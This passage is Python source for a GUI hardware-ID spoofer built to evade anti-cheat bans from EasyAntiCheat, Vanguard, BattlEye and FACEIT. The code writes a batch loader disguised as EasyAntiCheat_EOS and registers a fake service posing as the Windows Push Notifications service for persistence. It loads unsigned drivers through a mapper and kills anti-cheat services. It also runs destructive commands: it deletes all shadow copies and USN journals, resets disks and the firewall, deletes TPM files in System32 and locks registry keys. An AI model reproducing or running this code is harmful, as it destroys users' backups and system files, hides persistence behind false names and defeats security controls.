                (["asrock"], ("ASRock", "ASRock")),
            ]:
            if any(keyword in str(manufacturer).lower() for keyword in keywords):
                manufacturer, sysmanufacturer = values; break
        if str(bios).lower() not in str(('American Megatrends Inc','AMI')).lower():
            sendlogconsole('Unable Detected Compatible Firmware !\n', 'yellow')
        sendlogconsole(f'Spoofing SMBios ...   ({sysmanufacturer})\n','yellow')
        BootLoaderPath = f'C:\\Users\\Default\\AppData\\Local\\Microsoft\\GameDVR'
        BootLoader, ServiceBootLoader = f'{BootLoaderPath}\\EasyAntiCheat_EOS.CMD', f'{BootLoaderPath}\\EasyAntiCheat_EOS.vbs'
        BootLoaderMapper, BootLoaderDriver = f'{BootLoaderPath}\\EasyAntiCheat_EOS.exe', f'{BootLoaderPath}\\EasyAntiCheat_EOS.sys'
        if not os.path.exists(BootLoaderPath): os.makedirs(BootLoaderPath)
        if not os.path.exists(BootLoaderMapper): shutil.copy(f'{unpackpath}\\EasyAntiCheat_EOS.exe', BootLoaderMapper)
        if not os.path.exists(BootLoaderDriver): shutil.copy(f'{unpackpath}\\EasyAntiCheat_EOS.sys', BootLoaderDriver)  
        ProcessorSerial = 'Unknown' if 'AMD' in platform.processor().upper() else 'To Be Filled By O.E.M.'
        with open(BootLoader, "wb") as file:
            for line in [base64.b64decode(b"//4mY2xzDQo="),
                f'@ECHO OFF & TITLE C:\\Windows\\System32\\%RANDOM%-%RANDOM%-%RANDOM%.tpm\n',
                f'Bcdedit /Set Nointegritychecks Off',
                f'FOR %%X IN (vgc WmiPrvSE EasyAntiCheat_EOS BEService faceit EasyAntiCheat_EOS) DO Taskkill /F /IM "%%X.exe" /T >Nul 2>&1\n',
                f'FOR %%X IN (vgc WmiPrvSE EasyAntiCheat_EOS BEService faceit EasyAntiCheat_EOS) DO SC Stop "%%X" >Nul 2>&1 & Net Stop "%%X" >Nul 2>&1\n',
                f'FOR %%X IN (vgk vgc WmiPrvSE EasyAntiCheat_EOS BEService faceit EasyAntiCheat_EOS) DO SC Config "%%X" start=delayed-auto >Nul 2>&1\n',
                f'{BootLoaderMapper} /IVN "American Megatrends Inc." >Nul 2>&1\n',
                f'{BootLoaderMapper} /ID "{str("".join(choices(digits,k=4)))}" >Nul 2>&1\n',
                f'{BootLoaderMapper} /SP "System Product Name" >Nul 2>&1\n',
                f'{BootLoaderMapper} /SV "System Version" >Nul 2>&1\n',
                f'{BootLoaderMapper} /SS "{genlegitserial(wmi.InstancesOf("Win32_BIOS")[0].SerialNumber)}" >Nul 2>&1\n',
                f'{BootLoaderMapper} /SM "{sysmanufacturer}" >Nul 2>&1\n',
                f'{BootLoaderMapper} /SU "{str(uuid4())[:32].replace("-","")}" >Nul 2>&1\n',
                f'{BootLoaderMapper} /SK "SKU" >Nul 2>&1\n',
                f'{BootLoaderMapper} /SF "Default string" >Nul 2>&1\n',
                f'{BootLoaderMapper} /BV "Rev X.0x" >Nul 2>&1\n',
                f'{BootLoaderMapper} /BM "{manufacturer}" >Nul 2>&1\n',
                f'{BootLoaderMapper} /BS "{genlegitserial(wmi.InstancesOf("Win32_BaseBoard")[0].SerialNumber)}" >Nul 2>&1\n',
                f'{BootLoaderMapper} /BT "Default string" >Nul 2>&1\n',
                f'{BootLoaderMapper} /BLC "Default string" >Nul 2>&1\n',
                f'{BootLoaderMapper} /PSN "{ProcessorSerial}" >Nul 2>&1\n',
                f'{BootLoaderMapper} /PAT "{ProcessorSerial}" >Nul 2>&1\n',
                f'{BootLoaderMapper} /PPN "{ProcessorSerial}" >Nul 2>&1\n',
                f'{BootLoaderMapper} /CM "{manufacturer}" >Nul 2>&1\n',
                f'{BootLoaderMapper} /CV "Default string" >Nul 2>&1\n',
                f'{BootLoaderMapper} /CS "{genlegitserial(wmi.InstancesOf("Win32_SystemEnclosure")[0].SerialNumber)}" >Nul 2>&1\n',
                f'{BootLoaderMapper} /CA "{genlegitserial(wmi.InstancesOf("Win32_SystemEnclosure")[0].SMBIOSAssetTag)}" >Nul 2>&1\n',
                f'{BootLoaderMapper} /CO "0" >Nul 2>&1\n',
                f'{BootLoaderMapper} /CSK "Default string" >Nul 2>&1\n',
                f'FOR /L %%X IN (0,1,8) DO {BootLoaderMapper} /OS %%X "Default string" >Nul 2>&1\n',
                f'FOR /L %%X IN (0,1,5) DO {BootLoaderMapper} /SCO %%X "Default string" >Nul 2>&1\n',
                f'Taskkill /F /IM "WmiPrvSE.exe" /T >Nul 2>&1 & Ipconfig /flushdns >Nul 2>&1\n',
                f'FOR %%X IN (-repair -uninstall -install) DO Call "C:\\Program Files (x86)\\EasyAntiCheat_EOS\\EasyAntiCheat_EOS.exe" %%X >Nul 2>&1\n',
                f'FOR %%X IN (vgk vgc winmgmt EasyAntiCheat_EOS BEService faceit EasyAntiCheat_EOS) DO SC Start "%%X" >Nul 2>&1 & Net Start "%%X" >Nul 2>&1\n'
            ]: file.write(line.encode('utf-8') if isinstance(line, str) else line)
        start(f'{BootLoader}')
        with open(ServiceBootLoader, "w") as file: file.write(f'CreateObject("WScript.Shell").Run "{BootLoader}", 0, False')
        for cmd in [
            f'SC Create "WpnUserService_129874" binPath="C:\\Windows\\System32\\cscript.exe" start=auto',
            f'SC Config "WpnUserService_129874" binPath="C:\\Windows\\System32\\cscript.exe {ServiceBootLoader}" displayName="Windows Push Notifications User Service_112837"',
            f'SC Description "WpnUserService_129874" "This service hosts Windows notification platform which provides support for local and push notifications. Supported notifications are tile, toast and raw."'
        ]:start(cmd)
        sendlogconsole('SMBios Successfully Perm Spoofed !\n','green')
    except: sendlogconsole(f'Unable Spoofing SMBios !\n','red')

def UnflagDevices(): # Block Access To USB + USBSTOR For Hide Serials Ids
    sendlogconsole('Unflaging Devices ... (UWR)\n','yellow')
    try:
        for key in ['USB','USBSTOR','STORAGE\\VolumeSnapshot']:
            reg_path = fr"SYSTEM\CurrentControlSet\Enum\{key}"
            everyone_sid, _, _ = win32security.LookupAccountName(None, "Everyone")
            dacl = win32security.ACL(); dacl.AddAccessDeniedAce(win32security.ACL_REVISION, win32con.KEY_READ | win32con.KEY_WRITE, everyone_sid)
            reg_key = win32api.RegOpenKey(win32con.HKEY_LOCAL_MACHINE, reg_path, 0, win32con.KEY_READ)
            win32security.SetSecurityInfo(reg_key, win32security.SE_REGISTRY_KEY, win32security.DACL_SECURITY_INFORMATION, None, None, dacl) 
    except: pass
    sendlogconsole('Devices Successfully Unflagged !\n','green')
    
def VolumeID(): # VolumeID Spoofing
    sendlogconsole('Spoofing VolumeID ...\n','yellow')
    try:
        VolumeID = f'{unpackpath}\\vid.dll'
        for disk in ascii_lowercase:
            start(f'{VolumeID} {disk}: {"".join(choices("ABCDEF987654321",k=4))}-{"".join(choices("ABCDEF987654321",k=4))} -nobanner /accepteula')
            start(f'Fsutil usn deletejournal /n {disk}:')
        for x in range(15): start(f'REG DELETE "HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus {x}" /F')
        start(f'vssadmin delete shadows /All /Quiet')
        start(f'Powershell Reset-PhysicalDisk *')
        sendlogconsole('VolumeID Successfully Spoofed !\n','green')
    except: sendlogconsole('Unable Spoofing VolumeID !\n','red')

def DisableDevices(): # Devices Disabled ( WANs & Bluetooths )
    sendlogconsole('Disabling Bluetooths & WANs ...\n','yellow')
    try:
        for _ in range(3): start('Taskkill /F /IM "WmiPrvSE.exe" /T')
        CoInitialize(); wmi = win32com.client.GetObject("winmgmts:")
        for device in wmi.ExecQuery("SELECT * FROM Win32_PnPEntity"):
            if any(str(keyword).lower() in str(device.Name).lower() for keyword in ['Bluetooth','WAN']):
                start(f'Powershell Uninstall-PnpDevice -InstanceId "{device.DeviceID}" -Confirm:$false')
                start(f'Powershell Disable-PnpDevice -InstanceId "{device.DeviceID}" -Confirm:$false')
        sendlogconsole('Bluetooths & WANs Successfully Disabled !\n','green')
    except: sendlogconsole('Unable Disable Bluetooths & WANs !\n','red')

def UnflagNetwork(): # Unflag Network
    sendlogconsole('Unflaging Network ...\n','yellow')
    try:
        IntelNetCardEditor = f'{unpackpath}\\IntelNetCardEditor.exe'; RealtekNetCardEditor = f'{unpackpath}\\RealtekNetCardEditor.exe'
        CoInitialize(); wmi = win32com.client.GetObject("winmgmts:")
        for cmd in ['NETSH WINSOCK RESET','NETSH ADVFIREWALL RESET','NETSH INTERFACE IP RESET','NETSH INTERFACE TCP RESET','NBTSTAT -R','NBTSTAT -RR',
                    'NETSH INTERFACE IPV4 RESET','NETSH INTERFACE IPV6 RESET','NETSH INTERFACE RESET ALL']:start(f'{cmd}')
        for cmd in ['Certutil -URLCache * delete','Ipconfig /renew','Ipconfig /release','Ipconfig /registerdns','Ipconfig /flushdns']:start(f'{cmd}')
        for _ in range(5): start('ARP -A & ARP -D & ARP -D *')
        for adapter in wmi.ExecQuery("SELECT * FROM Win32_NetworkAdapter WHERE PhysicalAdapter=True"):
            if any(str(excluded_name).lower() in str(adapter.Name).lower() for excluded_name in ["Virtual","VPN","TAP","Microsoft","Hyper-V"]): continue
            mac = genlegitserial(str(adapter.MacAddress).replace(':',''))
            if str('Intel').lower() in str(adapter.Name).lower():
                for nic in range(1,2): start(f'{unpackpath}\\iqvsw64e.bat'); sleep(0.45); start(f'{IntelNetCardEditor} /NIC={nic} /MAC={mac}')
            elif str('Realtek').lower() in str(adapter.Name).lower():
                for nic in range(1,2): start(f'{RealtekNetCardEditor} /# {nic} /Efuse /NodeID "{mac}"')
            else:
                sendlogconsole('Unable permanently spoof card !\n','yellow')
            for _ in range(2):
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, f'SYSTEM\\CurrentControlSet\\Control\\Class\\{{4D36E972-E325-11CE-BFC1-08002bE10318}}\\{int(adapter.DeviceID):04d}', 0, winreg.KEY_SET_VALUE) as k:
                    winreg.SetValueEx(k, "NetworkAddress", 0, winreg.REG_SZ, mac)
            for toggle in ['disable', 'enable']: start(f'netsh interface set interface "{adapter.NetConnectionID}" admin={toggle}');sleep(0.45)
        while start("ping -n 1 discord.com >Nul 2>&1")!=0: pass
        sendlogconsole('Network Successfully Unflagged !\n','green')
    except Exception as e: sendlogconsole(f'Unable Unflag Network !\n{e}','red')

def Spoofing(): # Spoofing All
    logconsole.configure(state="normal"); logconsole.delete("1.0", "end"),logconsole.configure(state="disabled"); 
    Spoofing_btn.configure(state="disabled", text="Running ...")
    Permanent(); VolumeID(); UnflagDevices(); DisableDevices(); UnflagNetwork()
    Spoofing_btn.configure(text="Hardware Spoofed !?"),sleep(3)
    Spoofing_btn.configure(state="normal", text="Permanent Virtualizer")
Spoofing_btn = ctk.CTkButton(tab1, text="Permanent Virtualizer", fg_color=PremaryColor, hover_color=SecondaryColor,
    height=45, width=565, command=lambda: thread(target=Spoofing).start(), font=("Calibri", 26, "bold"), text_color=TextColor)
Spoofing_btn.place(x=5, y=325)

# Tab 2 ( Serials )
serialsconsole = ctk.CTkTextbox(tab2, width=590, height=310, font=("Calibri", 18, "bold"), corner_radius=10, border_width=1.6, border_color=PremaryColor, fg_color=FormColor2); serialsconsole.pack(padx=5, pady=5)
def getserials():
    try:
        for _ in range(3): start('Taskkill /F /IM "WmiPrvSE.exe" /T')
        CoInitialize(); wmi = win32com.client.GetObject("winmgmts:")
        serials = {
            'Manufacture': wmi.InstancesOf('Win32_BaseBoard')[0].Manufacturer,
            'BaseBoard': wmi.InstancesOf('Win32_BaseBoard')[0].SerialNumber,
            'BIOS': wmi.InstancesOf('Win32_BIOS')[0].SerialNumber,
            'UUID': wmi.InstancesOf('Win32_ComputerSystemProduct')[0].UUID,
            'CPU': wmi.InstancesOf('Win32_Processor')[0].SerialNumber
        }
        for adapter in wmi.ExecQuery("SELECT * FROM Win32_NetworkAdapter WHERE NetEnabled=True AND PhysicalAdapter=True"):
            if any(excluded_name in adapter.Name for excluded_name in ["Virtual", "VPN", "TAP", "Microsoft", "Hyper-V"]): continue
            serials[adapter.NetConnectionID] = str(adapter.MACAddress).replace(":", "-")
        for disk in wmi.InstancesOf('Win32_DiskDrive'):
            serials[str(disk.Model).strip() if str(disk.Model) else 'N/A'] = str(disk.SerialNumber).strip() if disk.SerialNumber else 'No Instance? N/A!'
        return serials
    except: pass
prev_serials = getserials()
state_serials = {key: 'notchanged' for key in prev_serials}
def check_serials():
    try:
        colors = {"changed": "#13ff00", "notchanged": "#fbff00", "red": "#FF0000", "key": PremaryColor}
        for c, v in colors.items():  serialsconsole.tag_config(c, foreground=v)
        RefreshSerials_btn.configure(state="disabled", text="Refreshing Serials ...")
        serialsconsole.configure(state="normal"); serialsconsole.delete("1.0", "end")
        for key, value in getserials().items():
            if prev_serials[key] != value:  state_serials[key] = 'changed'
            serialsconsole.insert("end", f"{key}: ", "key"), serialsconsole.insert("end", f"{value}\n", state_serials[key])
        serialsconsole.configure(state="disabled")
        RefreshSerials_btn.configure(state="normal", text="Refresh Serials")
    except Exception as e:
        serialsconsole.configure(state="normal"); serialsconsole.delete("1.0", "end")
        serialsconsole.insert("end", f"Unable Refresh Serials", "red"),serialsconsole.configure(state="disabled")
        RefreshSerials_btn.configure(state="normal", text="Refresh Serials")
RefreshSerials_btn = ctk.CTkButton(tab2, text="Refresh Serials", fg_color=PremaryColor, hover_color=SecondaryColor, text_color=TextColor,
    height=45, width=565, command=lambda: thread(target=check_serials).start(), font=("Calibri", 26, "bold"))
RefreshSerials_btn.place(x=5, y=325)
form2.after(1, lambda:thread(target=check_serials).start())

# Tab 3 ( Miscs )
def Support(): # Disk Spoofer ( Temp )
    Support_btn.configure(state="normal"); logconsole.delete("1.0", "end"),logconsole.configure(state="disabled"); 
    Support_btn.configure(state="disabled", text="Connecting ...")
    try: start(fr'Start {DicscordInvite}')
    except: sendlogconsole(f'Unable Connecting !\n','red')
    Support_btn.configure(text="Connected !"),sleep(3)
    Support_btn.configure(state="normal", text="Need Support ? Join Discord !")
Support_btn = ctk.CTkButton(tab3, text="Need Support ? Join Discord !", fg_color=PremaryColor, hover_color=SecondaryColor, text_color=TextColor,
    height=45, width=565, command=lambda: thread(target=Support).start(), font=("Calibri", 24, "bold"))
Support_btn.place(x=5, y=5)

def DiskSpoofing(): # Disk Spoofer ( Temp )
    sendlogconsole(f'Disk Spoofing ...\n','yellow')
    DiskSpoofer_btn.configure(state="normal"); logconsole.delete("1.0", "end"),logconsole.configure(state="disabled"); 
    DiskSpoofer_btn.configure(state="disabled", text="Running ...")
    try:
        Mapper, Driver = f'{unpackpath}\\ServicingUAPI.dll' , f'{unpackpath}\\disk.sys'
        start(f'"{Mapper}" "{Driver}"')
        start(f'Taskkill /F /IM "WmiPrvSE.exe" /T >Nul 2>&1 & Ipconfig /flushdns')
        for toggle in ['stop','start']:start(f'SC {toggle} winmgmt & Net {toggle} winmgmt /Y')
        sendlogconsole(f'Disk Successfully Temp Spoofed !\n','green')
    except: sendlogconsole(f'Unable Spoofing Disk !\n','red')
    DiskSpoofer_btn.configure(state="normal", text="Disk Successfully Temp Spoofed !")
DiskSpoofer_btn = ctk.CTkButton(tab3, text="Disk Spoofer", fg_color=PremaryColor, hover_color=SecondaryColor, text_color=TextColor,
    height=45, width=565, command=lambda: thread(target=DiskSpoofing).start(), font=("Calibri", 24, "bold"))
DiskSpoofer_btn.place(x=5, y=60)

def TpmSpoofing(): # TPM Spoofer ( UWR )
    sendlogconsole(f'Spoofing TPM ...\n','yellow')
    TpmSpoofer_btn.configure(state="normal"); logconsole.delete("1.0", "end"),logconsole.configure(state="disabled"); 
    TpmSpoofer_btn.configure(state="disabled", text="Running ...")
    try:
        start(f'Powershell -Command Clear-Tpm'); start(f'Powershell -Command Disable-TpmAutoProvisioning')
        Mapper, Driver = f'{unpackpath}\\ServicingUAPI.dll' , f'{unpackpath}\\tpm.sys'; start(f'"{Mapper}" "{Driver}"')
        start(f'Taskkill /F /IM "WmiPrvSE.exe" /T >Nul 2>&1 & Ipconfig /flushdns')
        for _ in ['stop','start']:start(f'SC {_} winmgmt & Net {_} winmgmt /Y')
        for _ in os.listdir('C:\\Windows\\System32'):
            if str(_).lower().startswith(str('TPM').lower()):
                try: start(f'Takeown /F "{_}" /A >Nul 2>&1 & Icacls "{_}" /Grant %UserName%:F >Nul 2>&1 & Del /F /S /Q "{_}"')
                except: pass
        sendlogconsole(f'TPM Successfully Temp Spoofed !\n','green')
    except: sendlogconsole(f'Unable Spoofing TPM !\n','red')
    TpmSpoofer_btn.configure(state="normal", text="TPM Successfully Temp Spoofed !")
TpmSpoofer_btn = ctk.CTkButton(tab3, text="TPM Spoofer", fg_color=PremaryColor, hover_color=SecondaryColor, text_color=TextColor,
    height=45, width=565, command=lambda: thread(target=TpmSpoofing).start(), font=("Calibri", 24, "bold"))
TpmSpoofer_btn.place(x=5, y=115)

def ArpSpoofing(): # ARP Spoofer ( Temp )
    sendlogconsole(f'Spoofing ARP ...\n','yellow')
    ArpSpoofer_btn.configure(state="normal"); logconsole.delete("1.0", "end"),logconsole.configure(state="disabled"); 
    ArpSpoofer_btn.configure(state="disabled", text="Running ...")
    try:
        Mapper, Driver = f'{unpackpath}\\ServicingUAPI.dll' , f'{unpackpath}\\nsiproxy.sys'
        start(f'"{Mapper}" "{Driver}"')
        start(f'Taskkill /F /IM "WmiPrvSE.exe" /T >Nul 2>&1 & Ipconfig /flushdns')
        for _ in ['stop','start']:start(f'SC {_} WmiPrvSE & Net {_} WmiPrvSE /Y')
        sendlogconsole(f'ARP Successfully Temp Spoofed !\n','green')
    except: sendlogconsole(f'Unable Spoofing ARP !\n','red')
    ArpSpoofer_btn.configure(state="normal", text="ARP Successfully Temp Spoofed !")
ArpSpoofer_btn = ctk.CTkButton(tab3, text="ARP Spoofer", fg_color=PremaryColor, hover_color=SecondaryColor, text_color=TextColor,
    height=45, width=565, command=lambda: thread(target=ArpSpoofing).start(), font=("Calibri", 24, "bold"))
ArpSpoofer_btn.place(x=5, y=170)

manufactures = [
    ("MSI","Micro-Star International Co., Ltd."), ("ASUS","ASUSTeK COMPUTER INC."),
    ("DELL","DELL"), ("HP","HP"), ("Lenovo","Lenovo"), ("Acer","Acer"),
    ("Gigabyte","Gigabyte Technology Co., Ltd."), ("ASRock","ASRock"),
]
optionlist = ctk.CTkComboBox(tab3, state="readonly", values=[brand[0] for brand in manufactures], height=45, width=150, font=("Calibri", 24, "bold"), button_color=PremaryColor, border_color=PremaryColor, text_color=TextColor); optionlist.place(x=5, y=225)
def changemanufacture():
    sendlogconsole(f'Changing Manufacture ...\n','yellow')
    fixmanufacture_btn.configure(state="disabled", text="Running ...")
    try:
        for brand in manufactures:
            if brand[0] == optionlist.get():
                Mapper = f'{unpackpath}\\EasyAntiCheat_EOS.exe'
                start(f'{Mapper} /SM "{brand[0]}"');start(f'{Mapper} /BM "{brand[1]}"')
                break
        start(f'Taskkill /F /IM "WmiPrvSE.exe" /T >Nul 2>&1 & Ipconfig /flushdns >Nul 2>&1\n')
        sendlogconsole(f'Manufacture Changed To {brand[0]} !\n','green')
    except: sendlogconsole(f'Unable Change Manufacture To {brand[0]} !\n','red')
    fixmanufacture_btn.configure(text="Manufacture Successfully Changed !?"),sleep(1.5)
    fixmanufacture_btn.configure(state="normal", text="Change Manufacture")
fixmanufacture_btn = ctk.CTkButton(tab3, height=45, width=405, text="Change Manufacture",font=("Calibri", 24, "bold"), fg_color=PremaryColor, hover_color=SecondaryColor, text_color=TextColor, command=lambda: thread(target=changemanufacture).start())
fixmanufacture_btn.place(x=165, y=225)

anim_alpha(form2); form2.mainloop(); form2.after(1, lambda: form1.attributes('-alpha', 0) and form1.destroy); cleanexit(False)
